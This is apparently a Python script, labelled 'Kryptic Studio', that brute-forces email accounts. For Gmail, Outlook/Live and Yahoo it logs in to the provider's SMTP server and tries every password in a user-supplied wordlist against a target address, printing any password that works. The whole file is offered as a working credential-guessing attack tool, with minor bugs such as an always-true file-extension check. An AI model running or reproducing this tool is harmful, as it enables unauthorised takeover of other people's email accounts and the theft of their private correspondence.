### Kryptic Studio ###

# Local Libraries


# Libraries

# Standard Libraries
import smtplib

# Function Deffinitions

def gmail():
    try:
        server = smtplib.SMTP('smtp.gmail.com', '587')
        server.ehlo()
        server.starttls()
        print("\nSuccess! Connected to Gmail")
    except:
        print("Failed! Could not conncet to Gmail")
        return

    while True:
        email = input("Enter Gmail Email: ")
        if "@gmail.com" not in email:
            email += "@gmail.com"
        passwordsList = input("Password List Path: ")
        if ".txt" or ".lst" not in passwordsList:
            try:
                passwordsFile = open("User List/" + passwordsList + ".txt", "r")
            except:
                try:
                    passwordsFile = open("User List/" + passwordsList + ".lst", "r")
                except: 
                    print("File Not found")

        count = 0
        for password in passwordsFile:
            password.rstrip()
            count += 1
            try:
                server.login(email, password)
                print("Success, The password was found!\n   >>> Pasword: {}".format(password))

                print("Email: {} \nPassword: {} \n".format(email, password))
                break
            except:
                print("[{}]Failed! Pasword: {}".format(count, password))
            #time.sleep(5)

        passwordsFile.close()
        break
    server.close()
    return

def live():
    try:
        server = smtplib.SMTP('smtp-mail.outlook.com', '587')
        server.ehlo()
        server.starttls()
        print("\nSuccess! Connected to Outlook")
    except:
        print("Failed! Could not conncet to Outlook")
        return

    while True:
        while True: 
            email = input("Enter Outlook[@hotmai.com, @outlook.com, @live.com] Email: ")
            if "@hotmail.com" in email or "@outlook.com" in email or "@live.com" in email:
                break
            else:
                pass
        passwordsList = input("Password List Path: ")
        if ".txt" or ".lst" not in passwordsList:
            try:
                passwordsFile = open("User List/" + passwordsList + ".txt", "r")
            except:
                try:
                    passwordsFile = open("User List/" + passwordsList + ".lst", "r")
                except: 
                    print("File Not found")

        count = 0
        for password in passwordsFile:
            password.rstrip()
            count += 1
            try:
                server.login(email, password)
                print("Success, The password was found!\n   >>> Pasword: {}".format(password))

                print("Email: {} \nPassword: {} \n".format(email, password))
                break
            except:
                print("[{}]Failed! Pasword: {}".format(count, password))
            #time.sleep(5)

        passwordsFile.close()
        break
    server.close()
    return

def yahoo():
    try:
        server = smtplib.SMTP('smtp.mail.yahoo.com', '587')
        server.ehlo()
        server.starttls()
        print("\nSuccess! Connected to Yahoo Mail")
    except:
        print("Failed! Could not conncet to Yahoo Mail")
        return

    while True:
        email = input("Enter Yahoo Email: ")
        if "@yahoo.com" not in email:
            email += "@yahoo.com"
        passwordsList = input("Password List Path: ")
        if ".txt" or ".lst" not in passwordsList:
            try:
                passwordsFile = open("User List/" + passwordsList + ".txt", "r")
            except:
                try:
                    passwordsFile = open("User List/" + passwordsList + ".lst", "r")
                except: 
                    print("File Not found")

        count = 0
        for password in passwordsFile:
            password.rstrip()
            count += 1
            try:
                server.login(email, password)
                print("Success, The password was found!\n   >>> Pasword: {}".format(password))

                print("Email: {} \nPassword: {} \n".format(email, password))
                break
            except:
                print("[{}]Failed! Pasword: {}".format(count, password))
            #time.sleep(5)

        passwordsFile.close()
        break
    server.close()
    return